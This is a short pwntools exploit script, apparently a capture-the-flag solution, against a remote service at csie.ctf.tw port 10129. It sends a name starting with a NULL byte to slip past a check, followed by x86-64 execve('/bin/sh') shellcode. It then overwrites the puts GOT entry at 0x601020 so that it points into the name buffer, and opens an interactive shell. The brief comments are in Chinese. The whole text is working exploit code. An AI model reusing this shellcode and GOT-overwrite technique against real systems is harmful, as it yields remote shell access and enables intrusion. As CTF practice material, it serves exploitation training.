from pwn import *
r = remote('csie.ctf.tw', 10129)
r.recvuntil("What's your name :")
# name輸入一個NULL繞過check + execve("/bin/sh")
r.send("\x00\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05\n")
r.recvuntil("Where do you want to write :")
# puts got
r.send("0x601020\n")
r.recvuntil("data :")
# name buffer的位址+1 (跳過NULL)
r.send("\xa1\x10\x60\x00\x00\x00\x00\x00\n")
r.interactive()
